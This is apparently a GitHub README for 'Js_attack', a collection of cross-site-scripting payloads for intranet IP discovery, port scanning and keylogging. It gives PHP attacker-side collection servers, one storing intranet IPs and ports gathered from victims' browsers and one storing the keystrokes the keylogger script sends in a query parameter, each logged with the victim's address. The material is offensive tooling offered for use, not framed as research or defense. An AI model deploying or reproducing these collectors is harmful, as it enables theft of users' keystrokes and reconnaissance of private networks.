# Js_attack - some .js with xss to attack
[![languages](https://img.shields.io/github/languages/top/imanfeng/Js_attack.svg)]

Usage example
------------------

1.Get-Intranet-ip.js & Scan-Intranet-port.js Server:
```
<?php
    date_default_timezone_set(PRC);
    $from = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d G:i:s");
    $ip = $_GET['ip'];
    $port = $_GET['port'];
    file_put_contents('./webrtc_ip.txt', $ip.' | '.$port.' | '.$time.' | from '.$from."\r\n", FILE_APPEND);
?>
```

2.keylogger.js Server:
```
<?php
    date_default_timezone_set(PRC);
    $from = $_SERVER['REMOTE_ADDR'];
    $time = date("Y-m-d G:i:s");

if(!empty($_GET['c'])) {
	$key = $_GET['c']; 
	file_put_contents('./keylogger.txt', $key.' | '.$time.' | '.$from."\r\n", FILE_APPEND);
}
?>

```
